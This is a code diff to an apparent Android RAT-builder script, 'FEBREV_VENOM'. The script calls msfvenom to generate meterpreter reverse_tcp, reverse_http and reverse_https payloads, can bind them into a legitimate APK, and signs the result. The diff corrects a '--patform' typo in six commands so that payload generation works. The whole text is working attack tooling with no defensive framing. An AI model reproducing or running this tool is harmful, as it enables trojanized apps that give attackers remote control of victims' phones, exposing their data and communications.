@@ -41,7 +41,7 @@ def venom():
         if bind=="Y" or bind=="Y":
             realapp=input("ENTER THE PATH OF THE ORIGINAL APK : ")
             if os.path.exists(realapp):
-                os.system(f"msfvenom -x {realapp} -p android/meterpreter/reverse_tcp -a dalvik --patform=android lhost={lhost} lport={lport} > {output}/{name} ")
+                os.system(f"msfvenom -x {realapp} -p android/meterpreter/reverse_tcp -a dalvik --platform=android lhost={lhost} lport={lport} > {output}/{name} ")
                 print("SIGNING YOUR APK>>>>>>")
                 os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
                 print("D--O--N--E...........!!!!!!")
@@ -49,7 +49,7 @@ def venom():
                 print("ERROR : cannot find the path of the app by FEBREV_VENOM.!!!!!!!!")
                 print("failed........!!!!!!!")
         else:
-            os.system(f"msfvenom -p android/meterpreter/reverse_tcp -a dalvik --patform=android lhost={lhost} lport={lport} > {output}/{name}")
+            os.system(f"msfvenom -p android/meterpreter/reverse_tcp -a dalvik --platform=android lhost={lhost} lport={lport} > {output}/{name}")
             print("SIGNING YOUR APK>>>>>>")
             os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
             print(f"{name} RAT apk CREATED SUCCESSFULLY IN {output} ")   
@@ -58,7 +58,7 @@ def venom():
         if bind == "Y" or bind == "Y":
             realapp = input("ENTER THE PATH OF THE ORIGINAL APK : ")
             if os.path.exists(realapp):
-                os.system(f"msfvenom -x {realapp} -p android/meterpreter/reverse_http -a dalvik --patform=android lhost={lhost}  lport={lport} > {output}/{name} ")
+                os.system(f"msfvenom -x {realapp} -p android/meterpreter/reverse_http -a dalvik --platform=android lhost={lhost}  lport={lport} > {output}/{name} ")
                 print("SIGNING YOUR APK>>>>>>")
                 os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
                 print("D--O--N--E...........!!!!!!")
@@ -66,7 +66,7 @@ def venom():
                 print("ERROR : cannot find the path of the app by FEBREV_VENOM.!!!!!!!!")
                 print("failed........!!!!!!!")
         else:
-            os.system(f"msfvenom -p android/meterpreter/reverse_http -a dalvik --patform=android lhost={lhost} lport={lport} > {output}/{name}")
+            os.system(f"msfvenom -p android/meterpreter/reverse_http -a dalvik --platform=android lhost={lhost} lport={lport} > {output}/{name}")
             print("SIGNING YOUR APK>>>>>>")
             os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
             print(f"{name} RAT apk CREATED SUCCESSFULLY IN {output} ")
@@ -75,7 +75,7 @@ def venom():
         if bind == "Y" or bind == "Y":
             realapp = input("ENTER THE PATH OF THE ORIGINAL APK : ")
             if os.path.exists(realapp):
-                os.system(f"msfvenom -x {realapp} -p android/meterpreter/reverse_https -a dalvik --patform=android lhost={lhost} lport={lport} > {output}/{name} ")
+                os.system(f"msfvenom -x {realapp} -p android/meterpreter/reverse_https -a dalvik --platform=android lhost={lhost} lport={lport} > {output}/{name} ")
                 print("SIGNING YOUR APK>>>>>>")
                 os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
                 print("D--O--N--E...........!!!!!!")
@@ -83,7 +83,7 @@ def venom():
                 print("ERROR : cannot find the path of the app by FEBREV_VENOM.!!!!!!!!")
                 print("failed........!!!!!!!")
         else:
-            os.system(f"msfvenom -p android/meterpreter/reverse_https -a dalvik --patform=android lhost={lhost} lport={lport} > {output}/{name}")
+            os.system(f"msfvenom -p android/meterpreter/reverse_https -a dalvik --platform=android lhost={lhost} lport={lport} > {output}/{name}")
             print("SIGNING YOUR APK>>>>>>")
             os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
             print(f"{name} RAT apk CREATED SUCCESSFULLY IN {output} ")
